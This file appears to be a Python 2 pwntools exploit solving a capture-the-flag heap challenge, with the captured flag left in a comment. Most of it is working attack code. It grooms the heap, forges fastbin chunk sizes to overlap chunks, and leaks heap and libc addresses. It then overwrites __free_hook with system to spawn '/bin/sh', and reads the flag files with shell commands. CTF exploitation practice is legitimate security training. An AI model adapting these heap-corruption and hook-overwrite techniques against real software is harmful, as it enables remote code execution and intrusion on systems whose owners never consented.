#!/home/gym/.venvs/ctf/bin/python2
import os
import sys
import thread
from pwn import *
#c = None
#l = None
#m = None
threads = None
TCNT=1
runing = True
import time

def main(c, l):
    #e = m.load_elf()
    #CTF{n0body_r3aaads_tis_anyw4y}

    # Node to overwrite stuff (delete)
    add_node([0], "A")
    # Placeholder for node 2 and the struct tree of node 4 (required for overlap)
    add_node([5], "A"*119)

    # placeholders for node 1 later (chunk overlap)
    add_node([1], "B"*991)
    sizes = p64(0x41)*40
    add_node([1, 0], sizes+"B"*(479-len(sizes)))
    ## kill nodes
    copy_node([0], [1])
    run_gc()

    ## Create fake fastbin chunk
    #fake_fast = 64
    fake_fast = 128 # full overlap
    chunksize = p64(fake_fast+1)
    add_node([1], "C"*1152+chunksize+"\xff")
    for i in range(256):
        run_gc()

    ## free five (place for 2 and partially 4)
    copy_node([0], [5])
    run_gc()
    add_node([2], 'D'*71)
    add_node([4], 'E'*256)

    #dlen = fake_fast - 40 # minimum overlap
    dlen = fake_fast - 33 # full overlap
    # Data overlaps node 4's tree->trees
    add_node([3], "E"*dlen)
    # Put heap pointer into node 3 data
    copy_node([0], [4, 0])
    heap = print_node([3]).split('\n')[0][23:]
    print heap
    heap = u64(heap.ljust(8, '\x00'))
    heap_base = heap - 0xb8
    print hex(heap_base)

    # canary to keep the heap from merging
    # future libc pointer
    add_node([5], "F"*180)
    add_node([6], "F"*15)
    # delete node 3 for rewrite
    copy_node([0], [3])
    run_gc()
    # create fake tree over node4's trees fake_tree->data points to libc addr
    payload = "A"*16+p64(heap_base+0x850)+p64(0)*6 + p64(heap_base+0xe8)+p64(heap_base+0xae0)
    # realloc node 3
    add_node([3], payload+ 'K'*(dlen-len(payload)))
    copy_node([0], [5])
    run_gc()
    # read fake tree data
    libc = print_node([4, 0]).split('\n')[0][7:]
    libc = u64(libc.ljust(8, '\x00'))
    libc_base =libc - (0xb58 + 0x3c1000)
    print hex(libc_base)
    # exploit worked
    runing = False
    # realloc libc node so we dont fuck things up too bad
    add_node([5], "F"*180)
    # realloc node 3 for the final showdown
    copy_node([0], [3])
    run_gc()
    # craft payload (www)
    freehook = l.symbols['__free_hook']+libc_base
    system = l.symbols['system']+libc_base
    payload = "A"*16+p64(heap_base+0x818+16)+p64(heap_base+0x818+24)+p64(freehook)+p64(heap_base+0x10)+p64(system)+'/bin/sh\0'
    add_node([3], payload+ 'K'*(dlen-len(payload)))
    copy_node([4, 4],[4, 0, 0])
    copy_node([4, 5],[4, 1, 0])
    # pray for all the seven gods
    c.sendline('4')
    c.sendline('cat flag*')
    c.sendline('cat flag*')
    c.sendline('cat /flag*')
    c.sendline('cat /*/flag*')
    c.sendline('cat /home/*/flag*')

    c.interactive()

def add_node(idx, data, size=None):
    c.sendlineafter("quit", "0")
    c.sendlineafter("?", " ".join(str(i) for i in idx))

    if size is None:
        size =  len(data)
    c.sendlineafter("?", str(size))
    if size != 0:
        c.send(data)

def copy_node(idx1, idx2):
    c.sendlineafter("quit", "2")
    c.sendlineafter("?", " ".join(str(i) for i in idx1))
    c.sendlineafter("?", " ".join(str(i) for i in idx2))

def print_node(idx):
    c.sendlineafter("quit", "1")
    c.sendlineafter("?", " ".join(str(i) for i in idx))
    return c.recvuntil("0) new node")

def run_gc(measure=False):
    c.sendlineafter("quit", "3")
    if measure:
        c.recvuntil("gc start")
        start = time.time()
        c.recvuntil("gc end")
        end = time.time()
        return end - start
    return 0

gdbs=[
    'c',
    'set epoch=0x1122334455660001',
    'c',
    # 'c',
    # 'c',
    # 'c',
    # 'c'
        ]
bp =[
    #'free'
    'gcalloc_global',
    'free_globals'
    #'new_node'
    #'print_tree'
    #'free_globals'
    #'*new_node+0xc8'
        ]

def thread_main(m, i,l):
    c = m.start(cmds=gdbs, bp=bp, ida=False)
    cnt = 0
    while runing:
        try:
            main(c, l)
            break
        except struct.error:
            c.close()
            print "Thread %d attempt %d failed" % (i, cnt)
            c = m.start(cmds=gdbs, bp=bp, ida=False)
            cnt +=1

if __name__ == "__main__":
    sys.path.append(os.path.expanduser('~/ctf/magicpwn'))
    try:
        from magicpwn import Magic
        # target: vm/native/remote
        # libc: vm/native/remote
        # config: path to config file
        # debug: gdb/villoc/gdbv/none
        m = Magic('vm', 'none', aslr=True, libc='local')
        #m = Magic('native', 'none', aslr=False, libc='remote')
        #m = Magic('native', 'villoc', aslr=False, libc='local')
        #m = Magic('remote', 'none', libc='remote')
        c = m.start(cmds=gdbs, bp=bp, ida=False)
        l = m.load_libc()
    except ImportError:
        c = process("./chall")
    for i in range(TCNT):
        #t = threading.Thread(target=thread_main, args=(m,i,l))
        #t.start()
        thread.start_new_thread(thread_main, (m, i, l))
